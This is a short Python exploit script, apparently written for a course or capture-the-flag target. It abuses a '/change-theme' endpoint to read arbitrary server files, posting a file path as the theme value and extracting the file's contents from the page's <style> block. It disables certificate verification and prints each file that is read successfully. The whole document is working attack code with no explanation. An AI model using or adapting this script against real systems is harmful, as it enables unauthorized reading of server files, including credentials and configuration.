import requests, urllib3, re, sys
urllib3.disable_warnings()
B = "https://mario.is-course.ru"
FAIL = 13979  # style length when the file read fails (base + default theme)


def style(path):
    s = requests.Session(); s.verify = False
    s.post(B + "/change-theme", data={"theme": path}, timeout=25)
    h = s.get(B + "/", timeout=25).text
    m = re.search(r"<style>(.*?)</style>", h, re.S)
    return m.group(1) if m else None


def read(path):
    c = style(path)
    if c is None or len(c) == FAIL:
        return None
    idx = c.find("background: #ff5252;")
    if idx >= 0:
        idx = c.find("\n", idx)
        return c[idx:].strip("\n ")
    return c


if __name__ == "__main__":
    for p in sys.argv[1:]:
        d = read(p)
        if d is None:
            print("--- %-45s FAIL" % p)
        else:
            print("=== %-45s OK len=%d" % (p, len(d)))
            print(d[:1500])
